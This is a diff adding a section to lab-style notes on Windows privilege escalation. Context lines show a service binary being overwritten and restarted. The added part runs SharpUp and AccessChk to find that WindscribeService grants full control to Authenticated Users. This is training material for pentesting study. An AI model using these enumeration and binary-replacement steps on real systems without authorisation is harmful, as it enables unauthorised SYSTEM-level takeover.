@@ -41,4 +41,39 @@ C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\Sec
 C:\htb> sc start SecurityService
 ```
 
-Privilege Escalation via Weak Service Escalation
+Privilege Escalation via Weak Service Escalation:
+
+We can use sharpup again to see for any modifiable service, taking WindscribeService as example:
+```
+C:\htb> SharpUp.exe audit
+ 
+=== SharpUp: Running Privilege Escalation Checks ===
+ 
+ 
+=== Modifiable Services ===
+ 
+  Name             : WindscribeService
+  DisplayName      : WindscribeService
+  Description      : Manages the firewall and controls the VPN tunnel
+  State            : Running
+  StartMode        : Auto
+  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
+```
+
+This time, sharpup did not tell us that the service binaries is modifiable, but the service itself is modifiable, we next use AccessChk from Sysinternals to enumerate permission:
+```
+C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
+ 
+Accesschk v6.13 - Reports effective permissions for securable objects
+Copyright ⌐ 2006-2020 Mark Russinovich
+Sysinternals - www.sysinternals.com
+ 
+WindscribeService
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\Authenticated Users
+        SERVICE_ALL_ACCESS
+```
